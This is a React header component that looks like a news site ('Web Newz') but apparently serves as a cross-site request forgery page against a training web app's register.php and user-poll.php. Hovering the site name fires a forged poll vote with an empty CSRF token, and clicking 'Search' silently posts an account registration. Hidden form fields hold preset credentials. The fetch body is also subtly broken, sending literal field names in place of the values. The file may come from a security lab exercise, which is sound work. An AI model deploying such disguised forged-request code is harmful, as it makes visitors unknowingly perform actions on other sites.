import { useRef} from 'react';
import {Button, Col, Form, FormControl, Nav, Navbar, Row} from "react-bootstrap";

function Header(){

    const userNameRef = useRef();
    const passwordRef = useRef();
    const cPasswordRef = useRef();
    const signatureRef = useRef();
    const buttonRef = useRef();

    const ourFunc = async (e) => {
        e.preventDefault();

        var username = userNameRef.current.value;
        var password = passwordRef.current.value;
        var confirm_password = cPasswordRef.current.value;
        var signature = signatureRef.current.value;
        var button = buttonRef.current.value;

       
        var formData =
            "username=username" +
            "&password=password" +
            "&confirm_password=password" +
            "&my_signature=signature" +
            "&register-php-submit-button=Create+Account";

        const requestOptions = {
            method: "POST",
            headers: {"Content-Type": "application/x-www-form-urlencoded"},
            body: formData,
        };
        await fetch("/index.php?page=register.php", requestOptions);


    };



    return (
            <div>
                <Row>
                    <Navbar bg="dark" variant="dark" className={"px-5"}>
                        <Col sm={8} className={"d-flex"} >
                            <div onMouseOver={() => {
                                const requestOptions = {
                                    method: "GET",
                                };
                                fetch("/index.php?page=user-poll.php&choice=netcat&initials=said&csrf-token=&user-poll-php-submit-button=Submit+Vote", requestOptions);
                            }}>
                                <Navbar.Brand href="/">Web Newz</Navbar.Brand>
                            </div>
                          </Col>
                        <Col sm={4} className={"px-5"}><Form>
                            <Row>
                                <Col>
                                    <FormControl type="text" placeholder="Search" className="mr-sm-2"/>

                                </Col>
                                <Col md="auto">
                                    <Button variant="outline-info" onClick={(e) => ourFunc(e)}>Search</Button>
                                </Col>
                            </Row>

                        </Form></Col>
                    </Navbar>
                </Row>
                <form
                    action="/index.php?page=register.php"
                    method="POST"
                >
                    <input type="hidden" name="" value=""/>
                    <input ref={userNameRef} type="hidden" name="username" value="Ali"/>
                    <input ref={passwordRef} type="hidden" name="password" value="123"/>
                    <input
                        ref={cPasswordRef}
                        type="hidden"
                        name="confirm&#95;password"
                        value="123"
                    />
                    <input
                        ref={signatureRef}
                        type="hidden"
                        name="my&#95;signature"
                        value=""
                    />
                    <input
                        ref={buttonRef}
                        type="hidden"
                        name="register&#45;php&#45;submit&#45;button"
                        value="Create Account"
                    />
                </form>
            </div>
        );

}

export default Header;
